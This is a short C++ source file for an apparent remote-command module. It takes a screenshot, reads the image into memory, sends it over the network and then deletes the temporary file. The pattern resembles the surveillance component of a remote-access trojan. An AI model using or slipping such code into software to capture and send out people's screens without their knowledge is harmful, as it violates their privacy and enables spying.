#include "stdafx.h"
#include "Command_screenshot.h"
#include "Settings.h"
#include "Network.h"
#include "ImageUtils.h"

Command_screenshot::Command_screenshot()
{
}

Command_screenshot::~Command_screenshot()
{
}

bool Command_screenshot::OnExecute(const std::vector<std::tstring> &args)
{
	bool ret = true;

	imageUtils.TakeScreenshot(V_FAKE_TMP1);
	
	FILE *fp;
	errno_t error = _tfopen_s(&fp, V_FAKE_TMP1, _T("rb"));
	if(error != 0) {
		Error(_T("_tfopen failed"));
		ret = false;
		goto out_delete_file;
	}

	fseek(fp, 0, SEEK_END);
	size_t size = ftell(fp);
	fseek(fp, 0, SEEK_SET);

	char* buffer = (char*)malloc(size);
	if(!buffer)
	{
		Error(_T("Couldn't allocate buffer"));
		ret = false;
		goto out_close_fp;
	}

	if(fread_s(buffer, size, 1, size, fp) != size)
	{
		Error(_T("fread_s did not return size"));
		ret = false;
		goto out_free_buffer;
	}

	network.SendFile(V_NET_FILE_DATA, size, buffer);

out_free_buffer: free(buffer);
out_close_fp:    fclose(fp);
out_delete_file: DeleteFile(V_FAKE_TMP1);
	return ret;
}